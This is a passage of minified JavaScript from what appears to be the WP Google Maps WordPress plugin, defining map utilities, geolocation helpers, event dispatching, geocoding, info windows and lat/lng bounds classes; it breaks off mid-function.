jQuery((function(e){var t={MARKER_PULL_DATABASE:"0",MARKER_PULL_XML:"1",PAGE_MAP_LIST:"map-list",PAGE_MAP_EDIT:"map-edit",PAGE_SETTINGS:"map-settings",PAGE_SUPPORT:"map-support",PAGE_CATEGORIES:"categories",PAGE_ADVANCED:"advanced",PAGE_CUSTOM_FIELDS:"custom-fields",maps:[],events:null,settings:null,restAPI:null,localized_strings:null,loadingHTML:'<div class="wpgmza-preloader"><div></div><div></div><div></div><div></div></div>',getCurrentPage:function(){switch(WPGMZA.getQueryParamValue("page")){case"wp-google-maps-menu":return window.location.href.match(/action=edit/)&&window.location.href.match(/map_id=\d+/)?WPGMZA.PAGE_MAP_EDIT:WPGMZA.PAGE_MAP_LIST;case"wp-google-maps-menu-settings":return WPGMZA.PAGE_SETTINGS;case"wp-google-maps-menu-support":return WPGMZA.PAGE_SUPPORT;case"wp-google-maps-menu-categories":return WPGMZA.PAGE_CATEGORIES;case"wp-google-maps-menu-advanced":return WPGMZA.PAGE_ADVANCED;case"wp-google-maps-menu-custom-fields":return WPGMZA.PAGE_CUSTOM_FIELDS;default:return null}},getScrollAnimationOffset:function(){return(WPGMZA.settings.scroll_animation_offset||0)+e("#wpadminbar").height()},getScrollAnimationDuration:function(){return WPGMZA.settings.scroll_animation_milliseconds?WPGMZA.settings.scroll_animation_milliseconds:500},animateScroll:function(t,o){var n=WPGMZA.getScrollAnimationOffset();o=o||WPGMZA.getScrollAnimationDuration(),e("html, body").animate({scrollTop:e(t).offset().top-n},o)},extend:function(e,t){var o=e;e.prototype=Object.create(t.prototype),e.prototype.constructor=o},guid:function(){var e=(new Date).getTime();return"undefined"!=typeof performance&&"function"==typeof performance.now&&(e+=performance.now()),"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(t){var o=(e+16*Math.random())%16|0;return e=Math.floor(e/16),("x"===t?o:3&o|8).toString(16)}))},hexOpacityToRGBA:function(e,t){var o=parseInt(e.replace(/^#/,""),16);return[(16711680&o)>>16,(65280&o)>>8,255&o,parseFloat(t)]},hexToRgba:function(e){var t;return/^#([A-Fa-f0-9]{3}){1,2}$/.test(e)?(3==(t=e.substring(1).split("")).length&&(t=[t[0],t[0],t[1],t[1],t[2],t[2]]),{r:(t="0x"+t.join(""))>>16&255,g:t>>8&255,b:255&t,a:1}):0},rgbaToString:function(e){return"rgba("+e.r+", "+e.g+", "+e.b+", "+e.a+")"},latLngRegexp:/^(\-?\d+(\.\d+)?),\s*(\-?\d+(\.\d+)?)$/,isLatLngString:function(e){if("string"!=typeof e)return null;e.match(/^\(.+\)$/)&&(e=e.replace(/^\(|\)$/,""));var t=e.match(WPGMZA.latLngRegexp);return t?new WPGMZA.LatLng({lat:parseFloat(t[1]),lng:parseFloat(t[3])}):null},stringToLatLng:function(e){var t=WPGMZA.isLatLngString(e);if(!t)throw new Error("Not a valid latLng");return t},isHexColorString:function(e){return"string"==typeof e&&!!e.match(/#[0-9A-F]{6}/i)},imageDimensionsCache:{},getImageDimensions:function(e,t){if(WPGMZA.imageDimensionsCache[e])t(WPGMZA.imageDimensionsCache[e]);else{var o=document.createElement("img");o.onload=function(n){var a={width:o.width,height:o.height};WPGMZA.imageDimensionsCache[e]=a,t(a)},o.src=e}},decodeEntities:function(e){return e.replace(/&(nbsp|amp|quot|lt|gt);/g,(function(e,t){return e[t]})).replace(/&#(\d+);/gi,(function(e,t){return String.fromCharCode(parseInt(t,10))}))},isDeveloperMode:function(){return this.settings.developer_mode||window.Cookies&&window.Cookies.get("wpgmza-developer-mode")},isProVersion:function(){return"1"==this._isProVersion},openMediaDialog:function(e){var t;if(t)return t.uploader.uploader.param("post_id",set_to_post_id),void t.open();(t=wp.media.frames.file_frame=wp.media({title:"Select a image to upload",button:{text:"Use this image"},multiple:!1})).on("select",(function(){attachment=t.state().get("selection").first().toJSON(),e(attachment.id,attachment.url)})),t.open()},getCurrentPosition:function(e,t,o){var n="getCurrentPosition";if(WPGMZA.userLocationDenied)t&&t({code:1,message:"Location unavailable"});else if(o&&(n="watchPosition"),navigator.geolocation){var a={enableHighAccuracy:!0};navigator.geolocation[n]?navigator.geolocation[n]((function(t){e&&e(t),WPGMZA.events.trigger("userlocationfound")}),(function(o){a.enableHighAccuracy=!1,navigator.geolocation[n]((function(t){e&&e(t),WPGMZA.events.trigger("userlocationfound")}),(function(e){console.warn(e.code,e.message),1==e.code&&(WPGMZA.userLocationDenied=!0),t&&t(e)}),a)}),a):console.warn(n+" is not available")}else console.warn("No geolocation available on this device")},watchPosition:function(e,t){return WPGMZA.getCurrentPosition(e,t,!0)},runCatchableTask:function(t,o){if(WPGMZA.isDeveloperMode())t();else try{t()}catch(t){var n=new WPGMZA.FriendlyError(t);e(o).html(""),e(o).append(n.element),e(o).show()}},assertInstanceOf:function(e,t){var o,n,a=WPGMZA.isProVersion()?"Pro":"";if("open-layers"===WPGMZA.settings.engine)o="OL";else o="Google";if(n=WPGMZA[o+a+t]?o+a+t:WPGMZA[a+t]?a+t:WPGMZA[o+t]?o+t:t,!(e instanceof WPGMZA[n]))throw new Error("Object must be an instance of "+n+" (did you call a constructor directly, rather than createInstance?)")},getMapByID:function(e){return!WPGMZA.isProVersion()||MYMAP.map instanceof WPGMZA.Map?MYMAP.map:MYMAP[e].map},isGoogleAutocompleteSupported:function(){return!(!window.google||!google.maps||!google.maps.places||!google.maps.places.Autocomplete||WPGMZA.CloudAPI&&WPGMZA.CloudAPI.isBeingUsed)},googleAPIStatus:window.wpgmza_google_api_status,isSafari:function(){var e=navigator.userAgent.toLowerCase();return e.match(/safari/i)&&!e.match(/chrome/i)},isTouchDevice:function(){return"ontouchstart"in window},isDeviceiOS:function(){return/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream||!!navigator.platform&&/iPad|iPhone|iPod/.test(navigator.platform)},isModernComponentStyleAllowed:function(){return!WPGMZA.settings.user_interface_style||"legacy"==WPGMZA.settings.user_interface_style||"modern"==WPGMZA.settings.user_interface_style},isElementInView:function(t){var o=e(window).scrollTop(),n=o+e(window).height(),a=e(t).offset().top,r=a+e(t).height();return a<o&&n<r||o<=a&&a<=n||o<=r&&r<=n},isFullScreen:function(){return a},getQueryParamValue:function(e){var t,o=new RegExp(e+"=([^&#]*)");return(t=window.location.href.match(o))?t[1]:null},notification:function(e,t){switch(arguments.length){case 0:e="",t=4e3;break;case 1:t=4e3}var o='<div class="wpgmza-popup-notification">'+e+"</div>";jQuery("body").append(o),setTimeout((function(){jQuery("body").find(".wpgmza-popup-notification").remove()}),t)}};for(var o in window.WPGMZA?window.WPGMZA=e.extend(window.WPGMZA,t):window.WPGMZA=t,WPGMZA_localized_data){var n=WPGMZA_localized_data[o];WPGMZA[o]=n}WPGMZA.settings.useLegacyGlobals=!0,jQuery((function(e){e(window).trigger("ready.wpgmza"),e("script[src*='wp-google-maps.combined.js'], script[src*='wp-google-maps-pro.combined.js']").length&&console.warn("Minified script is out of date, using combined script instead.");var t=e("script").filter((function(){return this.src.match(/(^|\/)jquery\.(min\.)?js(\?|$)/i)}));1<t.length&&console.warn("Multiple jQuery versions detected: ",t),WPGMZA.restAPI=WPGMZA.RestAPI.createInstance(),WPGMZA.CloudAPI&&(WPGMZA.cloudAPI=WPGMZA.CloudAPI.createInstance()),e(document).on("click",".wpgmza_edit_btn",(function(){WPGMZA.animateScroll("#wpgmaps_tabs_markers")}))}));var a=!1;function r(t){e(".wpgmza_map").each((function(t,o){var n=WPGMZA.isElementInView(o);o.wpgmzaScrollIntoViewTriggerFlag?n||(o.wpgmzaScrollIntoViewTriggerFlag=!1):n&&(e(o).trigger("mapscrolledintoview.wpgmza"),o.wpgmzaScrollIntoViewTriggerFlag=!0)}))}e(document).on("fullscreenchange",(function(){a=!!document.fullscreenElement})),e(window).on("load",(function(t){for(var o in[]){console.warn("The Array object has been extended incorrectly by your theme or another plugin. This can cause issues with functionality.");break}if("https:"!=window.location.protocol){var n='<div class="notice notice-warning"><p>'+WPGMZA.localized_strings.unsecure_geolocation+"</p></div>";e(".wpgmza-geolocation-setting").each((function(t,o){e(o).after(e(n))}))}})),e(window).on("scroll",r),e(window).on("load",r),WPGMZA.refreshOnLoad&&window.location.reload()})),jQuery((function(e){WPGMZA.Compatibility=function(){this.preventDocumentWriteGoogleMapsAPI()},WPGMZA.Compatibility.prototype.preventDocumentWriteGoogleMapsAPI=function(){var e=document.write;document.write=function(t){t.match&&t.match(/maps\.google/)||e.call(document,t)}},WPGMZA.compatiblityModule=new WPGMZA.Compatibility})),function(e,t){"object"==typeof exports?module.exports=t(e):"function"==typeof define&&define.amd?define([],t.bind(e,e)):t(e)}("undefined"!=typeof global?global:this,(function(e){if(e.CSS&&e.CSS.escape)return e.CSS.escape;return e.CSS||(e.CSS={}),e.CSS.escape=function(e){if(0==arguments.length)throw new TypeError("`CSS.escape` requires an argument.");for(var t,o=String(e),n=o.length,a=-1,r="",i=o.charCodeAt(0);++a<n;)0!=(t=o.charCodeAt(a))?r+=1<=t&&t<=31||127==t||0==a&&48<=t&&t<=57||1==a&&48<=t&&t<=57&&45==i?"\\"+t.toString(16)+" ":0==a&&1==n&&45==t||!(128<=t||45==t||95==t||48<=t&&t<=57||65<=t&&t<=90||97<=t&&t<=122)?"\\"+o.charAt(a):o.charAt(a):r+="ï¿½";return r}})),jQuery((function(e){function t(e){return e*(Math.PI/180)}Math.PI,WPGMZA.Distance={MILES:!0,KILOMETERS:!1,MILES_PER_KILOMETER:.621371,KILOMETERS_PER_MILE:1.60934,uiToMeters:function(e){return parseFloat(e)/(WPGMZA.settings.distance_units==WPGMZA.Distance.MILES?WPGMZA.Distance.MILES_PER_KILOMETER:1)*1e3},uiToKilometers:function(e){return.001*WPGMZA.Distance.uiToMeters(e)},uiToMiles:function(e){return WPGMZA.Distance.uiToKilometers(e)*WPGMZA.Distance.MILES_PER_KILOMETER},kilometersToUI:function(e){return WPGMZA.settings.distance_units==WPGMZA.Distance.MILES?e*WPGMZA.Distance.MILES_PER_KILOMETER:e},between:function(e,o){if(!(e instanceof WPGMZA.LatLng||"lat"in e&&"lng"in e))throw new Error("First argument must be an instance of WPGMZA.LatLng or a literal");if(!(o instanceof WPGMZA.LatLng||"lat"in o&&"lng"in o))throw new Error("Second argument must be an instance of WPGMZA.LatLng or a literal");if(e===o)return 0;var n=e.lat,a=e.lng,r=o.lat,i=o.lng,s=t(r-n),l=t(i-a);return e=Math.sin(s/2)*Math.sin(s/2)+Math.cos(t(n))*Math.cos(t(r))*Math.sin(l/2)*Math.sin(l/2),2*Math.atan2(Math.sqrt(e),Math.sqrt(1-e))*6371}}})),jQuery((function(e){WPGMZA.EliasFano=function(){if(!WPGMZA.EliasFano.isSupported)throw new Error("Elias Fano encoding is not supported on browsers without Uint8Array");WPGMZA.EliasFano.decodingTablesInitialised||WPGMZA.EliasFano.createDecodingTable()},WPGMZA.EliasFano.isSupported="Uint8Array"in window,WPGMZA.EliasFano.decodingTableHighBits=[],WPGMZA.EliasFano.decodingTableDocIDNumber=null,WPGMZA.EliasFano.decodingTableHighBitsCarryover=null,WPGMZA.EliasFano.createDecodingTable=function(){WPGMZA.EliasFano.decodingTableDocIDNumber=new Uint8Array(256),WPGMZA.EliasFano.decodingTableHighBitsCarryover=new Uint8Array(256);for(var e=WPGMZA.EliasFano.decodingTableHighBits,t=WPGMZA.EliasFano.decodingTableDocIDNumber,o=WPGMZA.EliasFano.decodingTableHighBitsCarryover,n=0;n<256;n++){var a=0;e[n]=[];for(var r=7;0<=r;r--)a=0<(n&1<<r)?(e[n][t[n]]=a,t[n]++,0):(a+1)%255;o[n]=a}WPGMZA.EliasFano.decodingTablesInitialised=!0},WPGMZA.EliasFano.prototype.encode=function(t){var o=0,n=0,a=0,r=0,i=0;if(0==t.length)return P;function s(e){return 255&e}var l=0,p=0,c=t[t.length-1]/t.length,g=Math.log2(c),h=Math.floor(g),u=(1<<h)-1,d=null,M=Math.floor((2+Math.ceil(Math.log2(c)))*t.length/8)+6,m=new Uint8Array(M);h<0&&(h=0),p=Math.floor(h*t.length/8+6),m[l++]=s(t.length),m[l++]=s(t.length>>8),m[l++]=s(t.length>>16),m[l++]=s(t.length>>24),m[l++]=s(h),t.forEach((function(t){var c=t-o-1;if(!e.isNumeric(t))throw new Error("Value is not numeric");if(t=parseInt(t),null!==d&&t<=d)throw new Error("Elias Fano encoding can only be used on a sorted, ascending list of unique integers.");for(d=t,n<<=h,n|=c&u,a+=h;7<a;)a-=8,m[l++]=s(n>>a);var g=1+(c>>h);for(r<<=g,r|=1,i+=g;7<i;)i-=8,m[p++]=s(r>>i);o=t})),0<a&&(m[l++]=s(n<<8-a)),0<i&&(m[p++]=s(r<<8-i));var P=new Uint8Array(m);return P.pointer=p,P},WPGMZA.EliasFano.prototype.decode=function(e){var t=0,o=[],n=WPGMZA.EliasFano.decodingTableHighBits,a=WPGMZA.EliasFano.decodingTableDocIDNumber,r=WPGMZA.EliasFano.decodingTableHighBitsCarryover,i=0,s=0,l=0,p=0,c=e[i++];c|=e[i++]<<8,c|=e[i++]<<16,c|=e[i++]<<24;var g,h=e[i++],u=0,d=0,M=1;for(g=Math.floor(h*c/8+6);g<e.pointer;g++){l+=r[M],p=a[M=e[g]];for(var m=0;m<p;m++){for(l<<=u,l|=d&(1<<u)-1;u<h;)l<<=8,l|=d=e[i++],u+=8;l>>=u-=h,l+=(n[M][m]<<h)+s+1,s=o[t++]=l,l=0}}return o}})),jQuery((function(e){WPGMZA.EventDispatcher=function(){WPGMZA.assertInstanceOf(this,"EventDispatcher"),this._listenersByType={}},WPGMZA.EventDispatcher.prototype.addEventListener=function(e,t,o,n){var a=e.split(/\s+/);if(1<a.length)for(var r=0;r<a.length;r++)this.addEventListener(a[r],t,o,n);else{if(!(t instanceof Function))throw new Error("Listener must be a function");var i={listener:t,thisObject:o||this,useCapture:!!n};(this._listenersByType.hasOwnProperty(e)?this._listenersByType[e]:this._listenersByType[e]=[]).push(i)}},WPGMZA.EventDispatcher.prototype.on=WPGMZA.EventDispatcher.prototype.addEventListener,WPGMZA.EventDispatcher.prototype.removeEventListener=function(e,t,o,n){var a,r;if(a=this._listenersByType[e]){o=o||this,n=!!n;for(var i=0;i<a.length;i++)if(r=a[i],(1==arguments.length||r.listener==t)&&r.thisObject==o&&r.useCapture==n)return void a.splice(i,1)}},WPGMZA.EventDispatcher.prototype.off=WPGMZA.EventDispatcher.prototype.removeEventListener,WPGMZA.EventDispatcher.prototype.hasEventListener=function(e){return!!_listenersByType[e]},WPGMZA.EventDispatcher.prototype.dispatchEvent=function(t){if(!(t instanceof WPGMZA.Event))if("string"==typeof t)t=new WPGMZA.Event(t);else{var o=t;for(var n in t=new WPGMZA.Event,o)t[n]=o[n]}for(var a=[],r=(t.target=this).parent;null!=r;r=r.parent)a.unshift(r);t.phase=WPGMZA.Event.CAPTURING_PHASE;for(var i=0;i<a.length&&!t._cancelled;i++)a[i]._triggerListeners(t);if(!t._cancelled){for(t.phase=WPGMZA.Event.AT_TARGET,this._triggerListeners(t),t.phase=WPGMZA.Event.BUBBLING_PHASE,i=a.length-1;0<=i&&!t._cancelled;i--)a[i]._triggerListeners(t);var s=this.element;for(r=this.parent;null!=r;r=r.parent)r.element&&(s=r.element);if(s){var l={};for(var p in t){var c=t[p];"type"==p&&(c+=".wpgmza"),l[p]=c}e(s).trigger(l)}}},WPGMZA.EventDispatcher.prototype.trigger=WPGMZA.EventDispatcher.prototype.dispatchEvent,WPGMZA.EventDispatcher.prototype._triggerListeners=function(e){var t,o;if(t=this._listenersByType[e.type])for(var n=0;n<t.length;n++)o=t[n],e.phase==WPGMZA.Event.CAPTURING_PHASE&&!o.useCapture||o.listener.call(t[n].thisObject,e)},WPGMZA.events=new WPGMZA.EventDispatcher})),jQuery((function(e){WPGMZA.AddressInput=function(t,o){if(!(t instanceof HTMLInputElement))throw new Error("Element is not an instance of HTMLInputElement");var n;this.element=t;var a={fields:["name","formatted_address"],types:["geocode"]};(n=e(t).attr("data-autocomplete-options"))&&(a=e.extend(a,JSON.parse(n))),o&&o.settings.wpgmza_store_locator_restrict&&(a.country=o.settings.wpgmza_store_locator_restrict),WPGMZA.isGoogleAutocompleteSupported()?(t.googleAutoComplete=new google.maps.places.Autocomplete(t,a),a.country&&t.googleAutoComplete.setComponentRestrictions({country:a.country})):WPGMZA.CloudAPI&&WPGMZA.CloudAPI.isBeingUsed&&(t.cloudAutoComplete=new WPGMZA.CloudAutocomplete(t,a))},WPGMZA.extend(WPGMZA.AddressInput,WPGMZA.EventDispatcher),WPGMZA.AddressInput.createInstance=function(e,t){return new WPGMZA.AddressInput(e,t)}})),jQuery((function(e){WPGMZA.Event=function(e){if("string"==typeof e&&(this.type=e),this.bubbles=!0,this.cancelable=!0,this.phase=WPGMZA.Event.PHASE_CAPTURE,this.target=null,this._cancelled=!1,"object"==typeof e)for(var t in e)this[t]=e[t]},WPGMZA.Event.CAPTURING_PHASE=0,WPGMZA.Event.AT_TARGET=1,WPGMZA.Event.BUBBLING_PHASE=2,WPGMZA.Event.prototype.stopPropagation=function(){this._cancelled=!0}})),jQuery((function(e){WPGMZA.FancyControls={formatToggleSwitch:function(t){var o=e("<div class='switch'></div>"),n=t,a=t.parentNode,r=e(a).text().trim(),i=e("<label></label>");e(n).addClass("cmn-toggle cmn-toggle-round-flat"),e(n).attr("id",e(n).attr("name")),e(i).attr("for",e(n).attr("name")),e(o).append(n),e(o).append(i),e(a).replaceWith(o),e(o).wrap(e("<div></div>")),e(o).after(r)},formatToggleButton:function(t){var o=e("<div class='switch'></div>"),n=t,a=t.parentNode,r=e(a).text().trim(),i=e("<label></label>");e(n).addClass("cmn-toggle cmn-toggle-yes-no"),e(n).attr("id",e(n).attr("name")),e(i).attr("for",e(n).attr("name")),e(i).attr("data-on",WPGMZA.localized_strings.yes),e(i).attr("data-off",WPGMZA.localized_strings.no),e(o).append(n),e(o).append(i),e(a).replaceWith(o),e(o).wrap(e("<div></div>")),e(o).after(r)}},e(".wpgmza-fancy-toggle-switch").each((function(e,t){WPGMZA.FancyControls.formatToggleSwitch(t)})),e(".wpgmza-fancy-toggle-button").each((function(e,t){WPGMZA.FancyControls.formatToggleButton(t)}))})),jQuery((function(e){WPGMZA.FriendlyError=function(){}})),jQuery((function(e){WPGMZA.Geocoder=function(){WPGMZA.assertInstanceOf(this,"Geocoder")},WPGMZA.Geocoder.SUCCESS="success",WPGMZA.Geocoder.ZERO_RESULTS="zero-results",WPGMZA.Geocoder.FAIL="fail",WPGMZA.Geocoder.getConstructor=function(){return"open-layers"===WPGMZA.settings.engine?WPGMZA.OLGeocoder:WPGMZA.GoogleGeocoder},WPGMZA.Geocoder.createInstance=function(){return new(WPGMZA.Geocoder.getConstructor())},WPGMZA.Geocoder.prototype.getLatLngFromAddress=function(e,t){if(WPGMZA.isLatLngString(e.address)){var o=e.address.split(/,\s*/),n=new WPGMZA.LatLng({lat:parseFloat(o[0]),lng:parseFloat(o[1])});t([n.latLng=n],WPGMZA.Geocoder.SUCCESS)}},WPGMZA.Geocoder.prototype.getAddressFromLatLng=function(e,t){t([new WPGMZA.LatLng(e.latLng).toString()],WPGMZA.Geocoder.SUCCESS)},WPGMZA.Geocoder.prototype.geocode=function(e,t){if("address"in e)return this.getLatLngFromAddress(e,t);if("latLng"in e)return this.getAddressFromLatLng(e,t);throw new Error("You must supply either a latLng or address")}})),jQuery((function(e){WPGMZA.GoogleAPIErrorHandler=function(){var t=this;if("google-maps"==WPGMZA.settings.engine&&("map-edit"==WPGMZA.currentPage||0==WPGMZA.is_admin&&1==WPGMZA.userCanAdministrator)){this.element=e(WPGMZA.html.googleMapsAPIErrorDialog),1==WPGMZA.is_admin&&this.element.find(".wpgmza-front-end-only").remove(),this.errorMessageList=this.element.find(".wpgmza-google-api-error-list"),this.templateListItem=this.element.find("li.template").remove(),this.messagesAlreadyDisplayed={};var o=console.error;console.error=function(e){t.onErrorMessage(e),o.apply(this,arguments)},"google-maps"!=WPGMZA.settings.engine||WPGMZA.settings.wpgmza_google_maps_api_key&&WPGMZA.settings.wpgmza_google_maps_api_key.length||WPGMZA.getCurrentPage()==WPGMZA.PAGE_MAP_EDIT||this.addErrorMessage(WPGMZA.localized_strings.no_google_maps_api_key,["https://www.wpgmaps.com/documentation/creating-a-google-maps-api-key/"])}},WPGMZA.GoogleAPIErrorHandler.prototype.onErrorMessage=function(e){var t;if(e)if((t=e.match(/You have exceeded your (daily )?request quota for this API/))||(t=e.match(/This API project is not authorized to use this API/))||(t=e.match(/^Geocoding Service: .+/))){var o=e.match(/http(s)?:\/\/[^\s]+/gm);this.addErrorMessage(t[0],o)}else(t=e.match(/^Google Maps.+error: (.+)\s+(http(s?):\/\/.+)/m))&&this.addErrorMessage(t[1].replace(/([A-Z])/g," $1"),[t[2]])},WPGMZA.GoogleAPIErrorHandler.prototype.addErrorMessage=function(t,o){var n=this;if(!this.messagesAlreadyDisplayed[t]){var a=this.templateListItem.clone();e(a).find(".wpgmza-message").html(t);var r=e(a).find(".wpgmza-documentation-buttons"),i=e(a).find(".wpgmza-documentation-buttons>a");if(i.remove(),o&&o.length){for(var s=0;s<o.length;s++){o[s];var l=i.clone(),p=WPGMZA.localized_strings.documentation;l.attr("href",o[s]),e(l).find("i").addClass("fa-external-link"),e(l).append(p)}r.append(l)}e(this.errorMessageList).append(a),e("#wpgmza_map, .wpgmza_map").each((function(t,o){var a=e(o).find(".wpgmza-google-maps-api-error-overlay");0==a.length&&(a=e("<div class='wpgmza-google-maps-api-error-overlay'></div>")).html(n.element.html()),setTimeout((function(){e(o).append(a)}),1e3)})),e(".gm-err-container").parent().css({"z-index":1}),this.messagesAlreadyDisplayed[t]=!0}},WPGMZA.googleAPIErrorHandler=new WPGMZA.GoogleAPIErrorHandler})),jQuery((function(e){WPGMZA.InfoWindow=function(e){var t=this;WPGMZA.EventDispatcher.call(this),WPGMZA.assertInstanceOf(this,"InfoWindow"),this.on("infowindowopen",(function(e){t.onOpen(e)})),e&&(this.mapObject=e,this.state=WPGMZA.InfoWindow.STATE_CLOSED,e.map?setTimeout((function(){t.onMapObjectAdded(event)}),100):e.addEventListener("added",(function(e){t.onMapObjectAdded(e)})))},WPGMZA.InfoWindow.prototype=Object.create(WPGMZA.EventDispatcher.prototype),WPGMZA.InfoWindow.prototype.constructor=WPGMZA.InfoWindow,WPGMZA.InfoWindow.OPEN_BY_CLICK=1,WPGMZA.InfoWindow.OPEN_BY_HOVER=2,WPGMZA.InfoWindow.STATE_OPEN="open",WPGMZA.InfoWindow.STATE_CLOSED="closed",WPGMZA.InfoWindow.getConstructor=function(){return"open-layers"===WPGMZA.settings.engine?WPGMZA.isProVersion()?WPGMZA.OLProInfoWindow:WPGMZA.OLInfoWindow:WPGMZA.isProVersion()?WPGMZA.GoogleProInfoWindow:WPGMZA.GoogleInfoWindow},WPGMZA.InfoWindow.createInstance=function(e){return new(this.getConstructor())(e)},WPGMZA.InfoWindow.prototype.getContent=function(e){var t="";this.mapObject instanceof WPGMZA.Marker&&(t=this.mapObject.address),e(t)},WPGMZA.InfoWindow.prototype.open=function(e,t){return this.mapObject=t,!WPGMZA.settings.disable_infowindows&&"1"!=WPGMZA.settings.wpgmza_settings_disable_infowindows&&!this.mapObject.disableInfoWindow&&(this.state=WPGMZA.InfoWindow.STATE_OPEN,!0)},WPGMZA.InfoWindow.prototype.close=function(){this.state!=WPGMZA.InfoWindow.STATE_CLOSED&&(this.state=WPGMZA.InfoWindow.STATE_CLOSED,this.trigger("infowindowclose"))},WPGMZA.InfoWindow.prototype.setContent=function(e){},WPGMZA.InfoWindow.prototype.setOptions=function(e){},WPGMZA.InfoWindow.prototype.onMapObjectAdded=function(){1==this.mapObject.settings.infoopen&&this.open()},WPGMZA.InfoWindow.prototype.onOpen=function(){}})),jQuery((function(e){WPGMZA.LatLng=function(e,t){if(this._lat=0,(this._lng=0)!=arguments.length)if(1==arguments.length){if("string"==typeof e){var o;if(!(o=e.match(WPGMZA.LatLng.REGEXP)))throw new Error("Invalid LatLng string");e={lat:o[1],lng:o[3]}}if("object"!=typeof e||!("lat"in e)||!("lng"in e))throw new Error("Argument must be a LatLng literal");this.lat=e.lat,this.lng=e.lng}else this.lat=e,this.lng=t},WPGMZA.LatLng.REGEXP=/^(\-?\d+(\.\d+)?),\s*(\-?\d+(\.\d+)?)$/,WPGMZA.LatLng.isValid=function(e){return"object"==typeof e&&"lat"in e&&"lng"in e},WPGMZA.LatLng.isLatLngString=function(e){return"string"==typeof e&&!!e.match(WPGMZA.LatLng.REGEXP)},Object.defineProperty(WPGMZA.LatLng.prototype,"lat",{get:function(){return this._lat},set:function(t){if(!e.isNumeric(t))throw new Error("Latitude must be numeric");this._lat=parseFloat(t)}}),Object.defineProperty(WPGMZA.LatLng.prototype,"lng",{get:function(){return this._lng},set:function(t){if(!e.isNumeric(t))throw new Error("Longitude must be numeric");this._lng=parseFloat(t)}}),WPGMZA.LatLng.fromString=function(e){if(!WPGMZA.LatLng.isLatLngString(e))throw new Error("Not a valid latlng string");var t=e.match(WPGMZA.LatLng.REGEXP);return new WPGMZA.LatLng({lat:parseFloat(t[1]),lng:parseFloat(t[3])})},WPGMZA.LatLng.prototype.toString=function(){return this._lat+", "+this._lng},WPGMZA.LatLng.fromCurrentPosition=function(e,t){t=t||{},e&&WPGMZA.getCurrentPosition((function(o){var n=new WPGMZA.LatLng({lat:o.coords.latitude,lng:o.coords.longitude});t.geocodeAddress?WPGMZA.Geocoder.createInstance().getAddressFromLatLng({latLng:n},(function(t){t.length&&(n.address=t[0]),e(n)})):e(n)}))},WPGMZA.LatLng.fromGoogleLatLng=function(e){return new WPGMZA.LatLng(e.lat(),e.lng())},WPGMZA.LatLng.toGoogleLatLngArray=function(e){var t=[];return e.forEach((function(e){if(!(e instanceof WPGMZA.LatLng||"lat"in e&&"lng"in e))throw new Error("Unexpected input");t.push(new google.maps.LatLng({lat:parseFloat(e.lat),lng:parseFloat(e.lng)}))})),t},WPGMZA.LatLng.prototype.toGoogleLatLng=function(){return new google.maps.LatLng({lat:this.lat,lng:this.lng})},WPGMZA.LatLng.prototype.toLatLngLiteral=function(){return{lat:this.lat,lng:this.lng}},WPGMZA.LatLng.prototype.moveByDistance=function(e,t){var o=parseFloat(e)/6371,n=parseFloat(t)/180*Math.PI,a=this.lat/180*Math.PI,r=this.lng/180*Math.PI,i=Math.sin(a),s=Math.cos(a),l=Math.sin(o),p=Math.cos(o),c=Math.sin(n),g=i*p+s*l*Math.cos(n),h=Math.asin(g),u=c*l*s,d=p-i*g,M=r+Math.atan2(u,d);this.lat=180*h/Math.PI,this.lng=180*M/Math.PI},WPGMZA.LatLng.prototype.getGreatCircleDistance=function(e,t){var o,n=this.lat,a=this.lng;if(1==arguments.length)o=new WPGMZA.LatLng(e);else{if(2!=arguments.length)throw new Error("Invalid number of arguments");o=new WPGMZA.LatLng(e,t)}var r=o.lat,i=o.lng,s=n.toRadians(),l=r.toRadians(),p=(r-n).toRadians(),c=(i-a).toRadians(),g=Math.sin(p/2)*Math.sin(p/2)+Math.cos(s)*Math.cos(l)*Math.sin(c/2)*Math.sin(c/2);return 2*Math.atan2(Math.sqrt(g),Math.sqrt(1-g))*6371}})),jQuery((function(e){WPGMZA.LatLngBounds=function(e,t){if(e instanceof WPGMZA.LatLngBounds){var o=e;this.south=o.south,this.north=o.north,this.west=o.west,this.east=o.east}else e&&t&&(this.south=e.lat,this.north=t.lat,this.west=e.lng,this.east=t.lng)},WPGMZA.LatLngBounds.fromGoogleLatLngBounds=function(e){if(!(e instanceof google.maps.LatLngBounds))throw new Error("Argument must be an instance of google.maps.LatLngBounds");var t=new WPGMZA.LatLngBounds,o=e.getSouthWest(),n=e.getNorthEast();return t.north=n.lat(),t.south=o.lat(),t.west=o.lng(),t.east=n.lng(),t},WPGMZA.LatLngBounds.fromGoogleLatLngBoundsLiteral=function(e){var t=new WPGMZA.LatLngBounds,o=e.southwest,n=e.northeast;return t.north=n.lat,t.south=o.lat,t.west=o.lng,t.east=n.lng,t},WPGMZA.LatLngBounds.prototype.isInInitialState=function(){return null==this.north&&null==this.south&&null==this.west&&null==this.east},WPGMZA.LatLngBounds.prototype.extend=function(e){if(e instanceof WPGMZA.LatLng||(e=new WPGMZA.LatLng(e)),this.isInInitialState())return this.north=this.south=e.lat,void(this.west=this.east=e.lng);e.lat<this.north&&(this.north=e.lat),e.lat>this.south&&(this.south=e.lat),e.lng<this.west&&(this.west=e.lng),e.lng>this.east&&(this.east=e.lng)},WPGMZA.LatLngBounds.prototype.extendByPixelMargin=function(e,t,o){var n=t;if(!(e instanceof WPGMZA.Map))throw new Error("First argument must be an instance of WPGMZA.Map");if(this.isInInitialState())throw new Error("Cannot extend by pixels in initial state");3<=arguments.length&&(n=o);var a=new WPGMZA.LatLng(this.south,this.west),r=new WPGMZA.LatLng(this.north,this.east);a=e.latLngToPixels(a),r=e.latLngToPixels(r),a.x-=t,a.y+=n,r.x+=t,r.y-=n,a=e.pixelsToLatLng(a.x,a.y),r=e.pixelsToLatLng(r.x,r.y),this.toString(),this.north=r.lat,this.south=a.lat,this.west=a.lng,this.east=r.lng},WPGMZA.LatLngBounds.prototype.contains=function(e){if(!(e instanceof WPGMZA.LatLng))throw new Error("Argument must be an instance of WPGMZA.LatLng");return!(e.lat<Math.min(this.north,this.south)||e.lat>Math.max(this.north,this.south)||!(this.west<this.east?e.lng>=this.west&&e.lng<=this.east:e.lng<=this.west||e.lng>=this.east))},WPGMZA.LatLngBounds.prototype.toString=function(){return this.north+"N "+this.south+"S "+this.west+"W 